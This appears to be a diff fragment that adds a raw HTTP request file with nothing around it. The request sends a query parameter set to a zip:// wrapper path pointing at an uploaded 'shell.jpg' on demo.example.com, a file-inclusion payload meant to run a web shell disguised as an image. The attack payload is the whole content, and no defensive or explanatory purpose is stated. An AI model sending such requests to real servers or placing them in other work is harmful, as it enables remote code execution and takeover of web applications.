@@ -1,0 +1,4 @@
+GET /a?q="zip://uploads/shell.jpg" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
